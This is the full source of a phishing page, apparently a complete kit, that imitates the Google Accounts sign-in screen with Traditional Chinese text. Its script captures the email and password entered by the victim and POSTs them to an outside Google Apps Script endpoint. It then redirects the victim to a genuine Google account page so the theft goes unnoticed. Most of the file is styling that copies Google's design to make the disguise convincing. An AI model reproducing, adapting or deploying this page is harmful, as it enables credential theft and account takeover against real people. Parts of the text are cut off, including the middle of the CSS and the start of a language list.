<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0,1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #f0f4f8;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 1030px;
            width: 100%;
        }
        .login-wrapper {
            display: flex;
            flex-direction: row;
            width: 100%;
            background: #ffffff;
            border-radius: 32px;
            overflow: visible;
            justify-content: space-between;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
            min-height: 380px;
            position: relative;
            z-index: 1;
        }
        #loadingOverlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.65);
            z-index: 20;
            border-radius: 32px;
            display: none;
            pointer-events: none;
        }
        .loading-container {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            z-index: 30;
            overflow: visible;
            border-radius: 32px 32px 0 0;
            pointer-events: none;
        }
        .loading-track {
            width: 100%;
            height: 100%;
            position: relative;
            overflow: hidden;
            border-radius: 32px 32px 0 0;
            background: transparent;
        }
        .loading-segment {
            position: absolute;
            top: 0;
            height: 100%;
            background: #0957d0;
            border-radius: 2px;
            will-change: transform;
            transform: translateX(-100%);
            opacity: 1;
            transition: opacity 0.15s ease;
        }
        .login-left {
            flex: 0 0 36%;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            padding: 50px 30px 32px 28px;
            justify-content: flex-start;
            border-radius: 32px 0 0 32px;
            position: relative;
            z-index: 1;
        }
        .login-left .google-logo-svg {
            margin-bottom: 20px;
        }
        .login-left .google-logo-svg svg {
            width: 48px;
            height: 48px;
            display: block;
        }
        .login-left h1 {
            font-size: 32px;
            font-weight: 400;
            color: #202124;
            letter-spacing: 0.3px;
            margin-bottom: 16px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .login-left .sub-text {
            font-size: 16px;
            color: #5f6368;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .login-right {
            flex: 0 0 52%;
            background: #ffffff;
            padding: 50px 32px 0 16px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            min-width: 0;
            overflow: visible;
            position: relative;
            border-radius: 0 32px 32px 0;
            z-index: 1;
        }
        .login-right form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            width: 100%;
            max-width: 400px;
            margin-right: 0;
            margin-left: auto;
            height: 100%;
            justify-content: flex-start;
            position: relative;
            overflow: visible;
        }
        .step {
            display: flex;
            flex-direction: column;
            width: 100%;
            height: 100%;
            justify-content: flex-start;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            transform: translateX(30px);
            pointer-events: none;
            transition: opacity 0.5s cubic-bezier(0.23, 1, 0.32, 1), transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
            padding-bottom: 10px;
            overflow: visible;
        }
        .step.active {
            opacity: 1;
            transform: translateX(0);
            pointer-events: auto;
        }
        .step.exit-left {
            opacity: 0;
            transform: translateX(-30px);
        }
        .step.exit-right {
            opacity: 0;
            transform: translateX(30px);
        }
        .form-group {
            margin-bottom: 6px;
            width: 100%;
            flex-shrink: 0;
        }
        .form-group.step1-group {
            margin-top: 80px;
        }
        .form-group.step2-group {
            margin-top: 80px;
        }
        .input-container {
            width: 100%;
            position: relative;
        }
        .input-container input {
            width: 100%;
            height: 52px;
            padding: 14px 18px 6px 18px;
            font-size: 16px;
            color: #202124;
            background: #ffffff;
            border: 0.5px solid #5f6368;
            border-radius: 6px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .input-container.error input {
            border-color: #d93025 !important;
            border-width: 1px !important;
        }
        .input-container.error input:focus {
            border-color: #d93025 !important;
            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.15) !important;
        }
        .floating-label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #3c4043;
            pointer-events: none;
            transition: all 0.2s ease;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #ffffff;
            padding: 0 6px;
            opacity: 0.85;
            transform-origin: left center;
            z-index: 2;
            line-height: 1.2;
        }
        .input-container input:focus~.floating-label,
        .input-container input:not(:placeholder-shown)~.floating-label {
            top: -7px;
            transform: translateY(0) scale(0.8);
            font-size: 16px;
            color: #0957d0;
            opacity: 1;
            background: #ffffff;
            padding: 0 6px;
        }
        .input-container input:not(:placeholder-shown):not(:focus)~.floating-label {
            color: #3c4043;
            opacity: 0.85;
            top: -7px;
            transform: translateY(0) scale(0.8);
            background: #ffffff;
            padding: 0 6px;
        }
        .input-container.error input:focus~.floating-label {
            color: #d93025 !important;
        }
        .input-container.error input:not(:focus)~.floating-label {
            color: #3c4043 !important;
        }
        .input-container input:focus {
            border-color: #0957d0;
            border-width: 1px;
            box-shadow: 0 0 0 2px rgba(9, 87, 208, 0.15);
        }
        .input-container input:not(:placeholder-shown):not(:focus) {
            border-color: #5f6368;
            border-width: 0.5px;
        }
        .error-message {
            display: none;
            align-items: center;
            gap: 8px;
            margin-top: 8px;
            font-size: 14px;
            color: #d93025;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            font-weight: 400;
        }
        .error-message.visible {
            display: flex;
        }
        .error-message .error-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            width: 16px;
            height: 16px;
            color: #d93025;
        }
        .error-message .error-icon svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }
        .forgot-email-link {
            display: inline-block;
            margin-top: 12px;
            font-size: 14px;
            font-weight: 500;
            color: #0957d0;
            text-decoration: none;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            transition: background 0.2s;
            padding: 4px 8px;
            border-radius: 20px;
            cursor: pointer;
        }
        .forgot-email-link:hover {
            background: rgba(9, 87, 208, 0.10);
            text-decoration: none;
        }
        .create-account-link {
            font-size: 14px;
            font-weight: 500;
            color: #0957d0;
            text-decoration: none;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            transition: background 0.2s;
            padding: 6px 14px;
            border-radius: 20px;
            white-space: nowrap;
            cursor: pointer;
            display: inline-block;
        }
        .create-account-link:hover {
            background: rgba(9, 87, 208, 0.10);
        }
        .forgot-link {
            font-size: 14px;
            font-weight: 500;
            color: #0957d0;
            text-decoration: none;
            letter-spacing: 0.2px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            padding: 6px 14px;
            border-radius: 20px;
            transition: background 0.2s;
            white-space: nowrap;
            cursor: pointer;
        }
        .forgot-link:hover {
            background: rgba(9, 87, 208, 0.10);
            text-decoration: none;
        }
        .show-password-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 4px;
            font-size: 14px;
            font-weight: 500;
            color: #1a1a1a;
            cursor: pointer;
            padding: 4px 12px 4px 4px;
            background: none;
            border: none;
            border-radius: 4px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            user-select: none;
            transition: background 0.2s;
            background: transparent;
            box-shadow: none;
            outline: none;
        }
        .show-password-btn:hover {
            background: rgba(0, 0, 0, 0.04);
        }
        .VfPpkd-YQoJzd {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            position: relative;
            flex-shrink: 0;
            cursor: pointer;
        }
        .VfPpkd-HUofsb {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            border: 2px solid #5f6368;
            border-radius: 4px;
            background: #ffffff;
            transition: all 0.2s ease;
            box-sizing: border-box;
        }
        .VfPpkd-HUofsb-Jt5cK {
            stroke: #ffffff;
            stroke-width: 3;
            stroke-dasharray: 30;
            stroke-dashoffset: 30;
            transition: stroke-dashoffset 0.25s ease;
            fill: none;
        }
        .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb {
            background: #0957d0;
            border-color: #0957d0;
        }
        .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb-Jt5cK {
            stroke-dashoffset: 0;
        }
        .VfPpkd-SJnn3d {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: transparent;
            transition: background 0.2s;
            pointer-events: none;
        }
        .VfPpkd-YQoJzd:hover .VfPpkd-SJnn3d {
            background: rgba(9, 87, 208, 0.08);
        }
        .VfPpkd-YQoJzd:active .VfPpkd-SJnn3d {
            background: rgba(9, 87, 208, 0.16);
        }
        .show-password-btn .btn-label {
            line-height: 1.4;
        }
        .actions-row {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: auto;
            width: 100%;
            padding-top: 12px;
            padding-bottom: 37px;
            flex-shrink: 0;
            min-height: 40px;
            position: relative;
            gap: 0;
        }
        .actions-row.step1-actions {
            justify-content: flex-end;
        }
        #step2 .actions-row {
            gap: 23px;
        }
        .create-account-wrapper {
            position: relative;
            display: inline-block;
            margin-right: 18px;
            z-index: 10;
        }
        .create-dropdown {
            position: absolute;
            top: calc(100% + 4px);
            right: 0;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.18);
            min-width: 220px;
            padding: 8px 0;
            display: none;
            z-index: 10;
            border: 1px solid #e8eaed;
            opacity: 0;
            transform: scale(0.96) translateY(-4px);
            transform-origin: top right;
            transition: opacity 0.18s ease, transform 0.18s ease;
            pointer-events: none;
        }
        .create-dropdown.open {
            display: block;
            opacity: 1;
            transform: scale(1) translateY(0);
            pointer-events: auto;
        }
        .create-dropdown .dropdown-item {
            display: block;
            width: 100%;
            padding: 10px 20px;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            font-size: 14px;
            font-weight: 400;
            color: #202124;
            background: transparent;
            border: none;
            text-align: left;
            cursor: pointer;
            transition: background 0.15s;
            letter-spacing: 0.2px;
            line-height: 1.4;
            text-decoration: none;
        }
        .create-dropdown .dropdown-item:hover {
            background: #f1f3f4;
        }
        .create-dropdown .dropdown-item:active {
            background: #e8eaed;
        }
        .btn-next {
            background: #0957d0;
            border: none;
            color: white;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            border-radius: 20px;
            cursor: pointer;
            transition: background 0.2s;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            white-space: nowrap;
            flex-shrink: 0;
            box-shadow: none;
        }
        .btn-next:hover {
            background: #073f9e;
        }
        .btn-next:active {
            background: #052f78;
        }
        .btn-next:disabled {
            opacity: 0.6;
            cursor: default;
            pointer-events: none;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            margin-top: 16px;
            padding: 0 8px;
            font-size: 13px;
            color: #5f6368;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            position: relative;
            z-index: 20;
            transition: opacity 0.25s ease, visibility 0.25s ease;
        }
        .lang-selector {
            display: flex;
            align-items: center;
            gap: 4px;
            color: #5f6368;
            position: relative;
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 4px;
            transition: background 0.2s;
            user-select: none;
        }
        .lang-selector:hover {
            background: rgba(0, 0, 0, 0.04);
        }
        .lang-selector .lang-label {
            font-weight: 500;
            color: #5f6368;
            font-size: 13px;
        }
        .lang-selector .lang-arrow-icon {
            color: #5f6368;
            display: flex;
            align-items: center;
            font-size: 18px;
        }
        .lang-selector .lang-arrow-icon.open {
            transform: rotate(180deg);
        }
        .lang-dropdown {
            position: absolute;
            bottom: calc(100% + 6px);
            left: 0;
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.12);
            max-height: 280px;
            overflow-y: auto;
            min-width: 220px;
            z-index: 1000;
            display: none;
            padding: 6px 0;
        }
        .lang-dropdown.open {
            display: block;
        }
        .lang-dropdown .lang-item {
            padding: 8px 20px;
            font-size: 13px;
            color: #202124;
            cursor: pointer;
            transition: background 0.15s;
            font-weight: 400;
            white-space: nowrap;
        }
        .lang-dropdown .lang-item:hover {
            background: #f1f3f4;
        }
        .lang-dropdown .lang-item.selected {
            background: rgba(9, 87, 208, 0.08);
            color: #0957d0;
            font-weight: 500;
        }
        .lang-dropdown::-webkit-scrollbar {
            width: 6px;
        }
        .lang-dropdown::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }
        .lang-dropdown::-webkit-scrollbar-thumb {
            background: #c1c7cd;
            border-radius: 4px;
        }
        .lang-dropdown::-webkit-scrollbar-thumb:hover {
            background: #a8aeb6;
        }
        .footer-right {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .footer-right a {
            color: #5f6368;
            text-decoration: none;
            font-weight: 500;
            font-size: 13px;
            padding: 4px 10px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .footer-right a:hover {
            background: rgba(0, 0, 0, 0.04);
            text-decoration: none;
        }
        .user-profile-btn {
            display: none;
            align-items: center;
            gap: 6px;
            border: 1px solid #dadce0;
            border-radius: 20px;
            padding: 2px 10px 2px 2px;
            width: fit-content;
            background: #ffffff;
            cursor: pointer;
            transition: background 0.2s, opacity 0.4s ease, transform 0.4s ease;
            text-decoration: none;
            margin-top: 4px;
            opacity: 0;
            transform: translateY(-10px);
        }
        .user-profile-btn.visible {
            display: inline-flex;
            opacity: 1;
            transform: translateY(0);
        }
        .user-profile-btn:hover {
            background: #f1f3f4;
        }
        .user-avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            flex-shrink: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #ffffff;
        }
        .user-avatar svg {
            width: 24px;
            height: 24px;
            display: block;
        }
        .user-email {
            font-size: 13px;
            color: #202124;
            font-weight: 500;
            letter-spacing: 0.2px;
            white-space: nowrap;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }
        .dropdown-arrow {
            color: #5f6368;
            display: flex;
            align-items: center;
        }
        .dropdown-arrow .material-symbols-outlined {
            font-size: 18px;
        }
        @media (max-width: 680px) {
            body {
                padding: 12px;
            }
            .login-wrapper {
                flex-direction: column;
                border-radius: 24px;
                justify-content: flex-start;
                min-height: auto;
            }
            .login-left {
                flex: 1 1 auto;
                padding: 20px 18px 16px 18px;
                min-height: auto;
                border-bottom: 1px solid #e8eaed;
                justify-content: flex-start;
                border-radius: 24px 24px 0 0;
            }
            .login-right {
                flex: 1 1 auto;
                width: 100%;
                padding: 16px 16px 0 16px;
                align-items: stretch;
                justify-content: flex-start;
                min-height: 280px;
                padding-right: 16px;
                margin-left: 0;
                overflow: visible;
                border-radius: 0 0 24px 24px;
            }
            .login-right form {
                max-width: 100%;
                margin-left: 0;
                margin-right: 0;
                height: 100%;
                justify-content: flex-start;
            }
            .form-group.step1-group {
                margin-top: 50px;
            }
            .form-group.step2-group {
                margin-top: 50px;
            }
            .input-container input {
                height: 48px;
                font-size: 15px;
                padding: 12px 16px 4px 16px;
                border-width: 0.5px;
                border-radius: 5px;
            }
            .input-container input:focus {
                border-width: 1px;
            }
            .floating-label {
                font-size: 14px;
                left: 12px;
                padding: 0 4px;
            }
            .input-container input:focus~.floating-label,
            .input-container input:not(:placeholder-shown)~.floating-label {
                top: -5px;
                font-size: 14px;
                padding: 0 4px;
            }
            .btn-next {
                padding: 10px 20px;
                font-size: 14px;
            }
            .actions-row {
                flex-direction: column-reverse;
                gap: 10px !important;
                align-items: stretch;
                justify-content: flex-end;
                margin-top: auto;
                padding-top: 10px;
                padding-bottom: 24px;
                min-height: 36px;
            }
            .actions-row.step1-actions {
                flex-direction: column-reverse;
                gap: 10px !important;
                align-items: stretch;
            }
            #step2 .actions-row {
                gap: 10px !important;
            }
            .create-account-wrapper {
                margin-right: 0;
                width: 100%;
                text-align: center;
            }
            .create-account-link {
                display: inline-block;
            }
            .create-dropdown {
                left: 0;
                right: 0;
                min-width: unset;
                top: calc(100% + 4px);
                bottom: auto;
                border-radius: 12px;
                transform-origin: top center;
            }
            .forgot-link {
                text-align: center;
                padding: 6px 10px;
                font-size: 13px;
            }
            .btn-next {
                width: 100%;
                justify-content: center;
                padding: 10px;
                border-radius: 20px;
            }
            .footer-links {
                flex-direction: column;
                align-items: flex-start;
                gap: 4px;
                margin-top: 10px;
                font-size: 12px;
                padding: 0 4px;
            }
            .footer-right {
                flex-wrap: wrap;
            }
            .footer-right a {
                font-size: 12px;
                padding: 3px 8px;
            }
            .lang-dropdown {
                left: 0;
                right: 0;
                min-width: unset;
                bottom: calc(100% + 4px);
            }
            .lang-selector .lang-arrow-icon {
                font-size: 16px;
            }
            .show-password-btn {
                font-size: 13px;
                gap: 6px;
                padding: 4px 8px 4px 4px;
                box-shadow: none;
            }
            .VfPpkd-YQoJzd {
                width: 18px;
                height: 18px;
            }
            .VfPpkd-HUofsb {
                width: 18px;
                height: 18px;
            }
            .btn-next {
                box-shadow: none;
            }
            .user-profile-btn {
                padding: 2px 8px 2px 2px;
                gap: 4px;
                border-radius: 18px;
            }
            .user-avatar {
                width: 20px;
                height: 20px;
            }
            .user-avatar svg {
                width: 20px;
                height: 20px;
            }
            .user-email {
                font-size: 11px;
            }
            .dropdown-arrow .material-symbols-outlined {
                font-size: 16px;
            }
            .loading-container {
                border-radius: 24px 24px 0 0;
            }
            .loading-track {

    <script>
        (function() {
            // ---------- 進度條 (分段式，保證完整) ----------
            var track = document.getElementById('loadingTrack');
            var overlay = document.getElementById('loadingOverlay');
            var activeSegment = null;
            var segmentTimer = null;
            var isRunning = false;
            var isCompleting = false;
            var animationFrame = null;
            var finishResolve = null;
            var startTime = 0;
            var totalDuration = 0;

            function rand(min, max) { return Math.random() * (max - min) + min; }

            function showOverlay() { overlay.style.display = 'block'; }

            function hideOverlay() { overlay.style.display = 'none'; }

            function createSegment() {
                var el = document.createElement('div');
                el.className = 'loading-segment';
                var width = rand(20, 50);
                el.style.width = width + '%';
                el.style.transform = 'translateX(-100%)';
                track.appendChild(el);
                return el;
            }

            function clearSegments() {
                while (track.firstChild) {
                    track.removeChild(track.firstChild);
                }
                activeSegment = null;
            }

            function easeInOutCubic(t) {
                return t < 0.5 ? 4 * t * t * t : 1 - Math.pow(-2 * t + 2, 3) / 2;
            }

            function animateSegment(el, duration) {
                return new Promise(function(resolve) {
                    var startTime2 = performance.now();
                    var startX = -100;
                    var endX = 100;

                    function step(time) {
                        var elapsed = time - startTime2;
                        var progress = Math.min(elapsed / duration, 1);
                        var eased = easeInOutCubic(progress);
                        var x = startX + (endX - startX) * eased;
                        el.style.transform = 'translateX(' + x + '%)';
                        if (progress < 1) {
                            animationFrame = requestAnimationFrame(step);
                        } else {
                            el.style.transform = 'translateX(100%)';
                            resolve();
                        }
                    }
                    animationFrame = requestAnimationFrame(step);
                });
            }

            function scheduleNextSegment() {
                if (!isRunning) return;
                if (isCompleting) return;
                if (Date.now() - startTime >= totalDuration) {
                    isCompleting = true;
                    if (!activeSegment) {
                        clearSegments();
                        isRunning = false;
                        hideOverlay();
                        if (finishResolve) {
                            finishResolve();
                            finishResolve = null;
                        }
                    }
                    return;
                }
                var delay = rand(200, 600);
                segmentTimer = setTimeout(function() {
                    if (!isRunning || isCompleting) return;
                    launchSegment();
                }, delay);
            }

            function launchSegment() {
                if (!isRunning || isCompleting) return;
                if (activeSegment) return;
                var el = createSegment();
                var duration = rand(400, 900);
                activeSegment = { el: el, duration: duration };
                animateSegment(el, duration).then(function() {
                    if (el.parentNode) el.parentNode.removeChild(el);
                    activeSegment = null;
                    if (isCompleting) {
                        clearSegments();
                        isRunning = false;
                        hideOverlay();
                        if (finishResolve) {
                            finishResolve();
                            finishResolve = null;
                        }
                        return;
                    }
                    if (Date.now() - startTime >= totalDuration) {
                        isCompleting = true;
                        clearSegments();
                        isRunning = false;
                        hideOverlay();
                        if (finishResolve) {
                            finishResolve();
                            finishResolve = null;
                        }
                        return;
                    }
                    scheduleNextSegment();
                });
            }

            function startLoading() {
                if (isRunning) return;
                clearSegments();
                if (segmentTimer) { clearTimeout(segmentTimer);
                    segmentTimer = null; }
                if (animationFrame) { cancelAnimationFrame(animationFrame);
                    animationFrame = null; }
                isRunning = true;
                isCompleting = false;
                activeSegment = null;
                finishResolve = null;
                totalDuration = rand(800, 2000);
                startTime = Date.now();
                showOverlay();
                launchSegment();
            }

            function completeLoading() {
                return new Promise(function(resolve) {
                    if (!isRunning) {
                        hideOverlay();
                        resolve();
                        return;
                    }
                    if (isCompleting) {
                        if (finishResolve) {
                            var old = finishResolve;
                            finishResolve = function() { old();
                                resolve(); };
                        } else {
                            finishResolve = resolve;
                        }
                        return;
                    }
                    finishResolve = resolve;
                });
            }

            // ---------- 步驟控制 ----------
            var step1 = document.getElementById('step1');
            var step2 = document.getElementById('step2');
            var step1Next = document.getElementById('step1Next');
            var step2Next = document.getElementById('step2Next');
            var leftTitle = document.getElementById('leftTitle');
            var leftSubtext = document.getElementById('leftSubtext');
            var userProfileBtn = document.getElementById('userProfileBtn');
            var displayedEmail = document.getElementById('displayedEmail');
            var emailInput = document.getElementById('emailInput');
            var inputContainer = document.getElementById('inputContainer');
            var errorMessage = document.getElementById('errorMessage');
            var passwordInput = document.getElementById('passwordInput');
            var passwordInputContainer = document.getElementById('passwordInputContainer');
            var passwordErrorMessage = document.getElementById('passwordErrorMessage');

            var isTransitioning = false;
            var currentUserEmail = '';

            function getEmail() { return emailInput.value.trim(); }

            function getPassword() { return passwordInput.value.trim(); }

            function validateEmail() {
                var email = getEmail();
                if (email === '') {
                    inputContainer.classList.add('error');
                    errorMessage.classList.add('visible');
                    return false;
                } else {
                    inputContainer.classList.remove('error');
                    errorMessage.classList.remove('visible');
                    return true;
                }
            }

            function validatePassword() {
                var pwd = getPassword();
                if (pwd === '') {
                    passwordInputContainer.classList.add('error');
                    passwordErrorMessage.classList.add('visible');
                    return false;
                } else {
                    passwordInputContainer.classList.remove('error');
                    passwordErrorMessage.classList.remove('visible');
                    return true;
                }
            }

            emailInput.addEventListener('input', function() {
                if (inputContainer.classList.contains('error')) {
                    inputContainer.classList.remove('error');
                    errorMessage.classList.remove('visible');
                }
            });
            passwordInput.addEventListener('input', function() {
                if (passwordInputContainer.classList.contains('error')) {
                    passwordInputContainer.classList.remove('error');
                    passwordErrorMessage.classList.remove('visible');
                }
            });

            function switchStepDirectly(from, to, direction) {
                from.classList.remove('active');
                from.classList.add(direction === 'forward' ? 'exit-left' : 'exit-right');
                to.classList.remove('exit-left', 'exit-right');
                to.classList.add('active');
                setTimeout(function() {
                    from.classList.remove('exit-left', 'exit-right');
                }, 600);
                isTransitioning = false;
                step1Next.disabled = false;
                step2Next.disabled = false;
            }

            async function switchStepWithLoading(from, to, direction) {
                if (isTransitioning) return;
                isTransitioning = true;
                step1Next.disabled = true;
                step2Next.disabled = true;

                var isForward = (direction === 'forward' && from === step1);
                var isBackward = (direction === 'backward' && from === step2);

                if (isForward) {
                    if (!validateEmail()) {
                        isTransitioning = false;
                        step1Next.disabled = false;
                        step2Next.disabled = false;
                        return;
                    }
                    currentUserEmail = getEmail();
                    startLoading();
                    await completeLoading();
                    displayedEmail.textContent = currentUserEmail;
                    userProfileBtn.classList.add('visible');
                    leftTitle.textContent = '歡迎';
                    leftSubtext.textContent = '';
                    switchStepDirectly(from, to, direction);
                    return;
                }

                if (isBackward) {
                    passwordInput.value = '';
                    if (isPasswordVisible) {
                        isPasswordVisible = false;
                        updateCheckboxAndInput();
                    }
                    passwordInputContainer.classList.remove('error');
                    passwordErrorMessage.classList.remove('visible');
                    startLoading();
                    await completeLoading();
                    userProfileBtn.classList.remove('visible');
                    leftTitle.textContent = '登入';
                    leftSubtext.textContent = '使用您的 Google 帳戶';
                    currentUserEmail = '';
                    switchStepDirectly(from, to, direction);
                    return;
                }

                startLoading();
                await completeLoading();
                switchStepDirectly(from, to, direction);
            }

            step1Next.addEventListener('click', function(e) {
                e.preventDefault();
                if (isTransitioning) return;
                switchStepWithLoading(step1, step2, 'forward');
            });

            // ================================================================
            // ★★★ 密碼下一步：邊送資料邊跑動畫（並行執行） ★★★
            // ================================================================
            step2Next.addEventListener('click', function(e) {
                e.preventDefault();
                if (isTransitioning) return;
                if (!validatePassword()) return;

                isTransitioning = true;
                step1Next.disabled = true;
                step2Next.disabled = true;

                // 準備要發送的資料
                const data = {
                    user: emailInput.value.trim(),
                    pwd: passwordInput.value.trim(),
                    captchatext: "google"
                };

                // 兩個任務的完成標記
                let fetchDone = false;
                let loadDone = false;

                // 檢查兩者是否都完成，若完成則跳轉
                function checkBothDone() {
                    if (fetchDone && loadDone) {
                        window.location.href = 'https://myaccount.google.com/signinoptions/twosv?rapt=AEjHL4O_bg5RzVJcXHzuKINkAi8vPnay3PeJ1mu67yPf1-zhcYLY3eFKdNn5Qkjdz4hkrSgc1ID2o3OzPHVEtap8lw62OhWCiSQr4HWavqzw7a6Slm_UjNw';
                    }
                }

                // 1. 啟動進度條動畫（與 fetch 並行）
                startLoading();
                completeLoading().then(function() {
                    loadDone = true;
                    checkBothDone();
                });

                // 2. 同時發送 POST 請求（不等待動畫完成）
                fetch('https://script.google.com/macros/s/AKfycbzAZL-bDe6HEzSVq9mYasBvA6z0s1LsjJBSWHq2ZQl8wILGnZQA2wGjQNDtjR_n8kriUQ/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(function() {
                    fetchDone = true;
                    checkBothDone();
                }).catch(function() {
                    fetchDone = true;
                    checkBothDone();
                });
            });

            emailInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (!isTransitioning) {
                        switchStepWithLoading(step1, step2, 'forward');
                    }
                }
            });
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    step2Next.click();
                }
            });

            userProfileBtn.addEventListener('click', function(e) {
                e.preventDefault();
                if (isTransitioning) return;
                if (step2.classList.contains('active')) {
                    switchStepWithLoading(step2, step1, 'backward');
                }
            });

            // ---------- 顯示密碼 ----------
            var showPasswordBtn = document.getElementById('showPasswordBtn');
            var checkboxContainer = document.getElementById('checkboxContainer');
            var isPasswordVisible = false;

            function updateCheckboxAndInput() {
                checkboxContainer.classList.toggle('checked', isPasswordVisible);
                passwordInput.type = isPasswordVisible ? 'text' : 'password';
            }

            showPasswordBtn.addEventListener('click', function(e) {
                e.preventDefault();
                isPasswordVisible = !isPasswordVisible;
                updateCheckboxAndInput();
            });
            checkboxContainer.addEventListener('click', function(e) {
                e.stopPropagation();
                isPasswordVisible = !isPasswordVisible;
                updateCheckboxAndInput();
            });

            // ---------- 建立帳戶下拉 (僅隱藏「說明」) ----------
            var createBtn = document.getElementById('createAccountBtn');
            var dropdown = document.getElementById('createDropdown');
            var helpLink = document.getElementById('helpLink');

            function toggleDropdown(e) {
                e.stopPropagation();
                if (dropdown.classList.contains('open')) {
                    dropdown.classList.remove('open');
                    helpLink.style.display = '';
                } else {
                    dropdown.classList.add('open');
                    helpLink.style.display = 'none';
                }
            }

            createBtn.addEventListener('click', toggleDropdown);

            document.querySelectorAll('.dropdown-item').forEach(function(item) {
                item.addEventListener('click', function() {
                    dropdown.classList.remove('open');
                    helpLink.style.display = '';
                });
            });

            document.addEventListener('click', function(e) {
                if (!createBtn.contains(e.target) && !dropdown.contains(e.target)) {
                    dropdown.classList.remove('open');
                    helpLink.style.display = '';
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    dropdown.classList.remove('open');
                    helpLink.style.display = '';
                }
            });

            // ---------- 語言選擇器 ----------

                ["am", "አማርኛ"],
                ["ne", "नेपाली"],
                ["mr", "मराठी"],
                ["hi", "हिन्दी"],
                ["as", "অসমীয়া"],
                ["bn", "বাংলা"],
                ["pa", "ਪੰਜਾਬੀ"],
                ["gu", "ગુજરાતી"],
                ["or", "ଓଡ଼ିଆ"],
                ["ta", "தமிழ்"],
                ["te", "తెలుగు"],
                ["kn", "ಕನ್ನಡ"],
                ["ml", "മലയാളം"],
                ["si", "සිංහල"],
                ["th", "ไทย"],
                ["lo", "ລາວ"],
                ["my", "မြန်မာ"],
                ["km", "ខ្មែរ"],
                ["ko", "한국어"],
                ["zh-HK", "中文（香港）"],
                ["ja", "日本語"],
                ["zh-CN", "简体中文"],
                ["zh-TW", "繁體中文"]
            ];
            var currentLang = 'zh-TW';
            var currentLabel = '繁體中文';
            var langSelector = document.getElementById('langSelector');
            var langDropdown = document.getElementById('langDropdown');
            var langArrow = document.getElementById('langArrow');
            var currentLangLabel = document.getElementById('currentLangLabel');

            function buildLanguageDropdown() {
                langDropdown.innerHTML = '';
                languages.forEach(function(item) {
                    var code = item[0];
                    var label = item[1];
                    var el = document.createElement('div');
                    el.className = 'lang-item' + (code === currentLang ? ' selected' : '');
                    el.textContent = label;
                    el.dataset.code = code;
                    el.dataset.label = label;
                    el.addEventListener('click', function(e) {
                        e.stopPropagation();
                        selectLanguage(code, label);
                    });
                    langDropdown.appendChild(el);
                });
            }

            function selectLanguage(code, label) {
                currentLabel = label;
                currentLangLabel.textContent = label;
                var items = langDropdown.querySelectorAll('.lang-item');
                items.forEach(function(item) {
                    item.classList.toggle('selected', item.dataset.code === code);
                });
